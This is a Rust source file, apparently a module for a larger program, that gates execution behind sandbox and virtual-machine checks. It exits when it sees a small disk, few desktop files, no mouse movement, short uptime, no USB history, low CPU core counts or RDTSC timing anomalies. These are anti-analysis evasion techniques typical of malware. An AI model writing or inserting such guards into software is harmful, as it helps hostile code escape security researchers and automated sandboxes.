mod tick;
mod mouse;
mod desktop_files;
mod api_flood;
mod c_drive;
mod uptime;
mod usb_mount;
mod cpu_info;
mod rdtsc_timing;

#[cfg(feature = "sandbox")]
pub fn guard_vm() {
    use std::process;

    #[cfg(feature = "vm_check_c_drive")]
    {
        let c_min_gb: u64 = 50;
        if !c_drive::is_c_drive_total_over(c_min_gb) { process::exit(1); }
    }

    #[cfg(feature = "vm_check_desktop_files")]
    {
        let desktop_min: usize = 30;
        if !desktop_files::check_desktop_files(desktop_min) { process::exit(1); }
    }

    #[cfg(feature = "vm_check_tick")]
    if tick::is_tick_abnormal() { process::exit(1); }
    
    #[cfg(feature = "vm_check_api_flood")]
    {
        let api_iter: u32 = 5_000;
        let api_threshold: u128 = 20;
        if api_flood::is_running_in_vm_api_flooding(api_iter, api_threshold) { process::exit(1); }
    }

    #[cfg(feature = "vm_check_mouse")]
    if !mouse::has_human_mouse_movement() { process::exit(1); }

    #[cfg(feature = "vm_check_uptime")]
    {
        let uptime_min_minutes: u64 = 60;
        if uptime::is_system_uptime_suspicious(uptime_min_minutes) { process::exit(1); }
    }

    #[cfg(feature = "vm_check_usb_mount")]
    if !usb_mount::has_usb_history() { process::exit(1); }

    
    #[cfg(feature = "vm_check_cpu_info")]
    {
        let min_cores: u32 = 2;
        if cpu_info::check_cpu_model() || cpu_info::check_cpu_cores(min_cores) || cpu_info::check_cpu_vendor() { process::exit(1); }
    }

    #[cfg(feature = "vm_check_rdtsc_timing")]
    {
        let sleep_ms: u64 = 500;
        let threshold_ratio: f64 = 0.8;
        if rdtsc_timing::check_rdtsc_sandboxed(sleep_ms, threshold_ratio) { process::exit(1); }
    }
}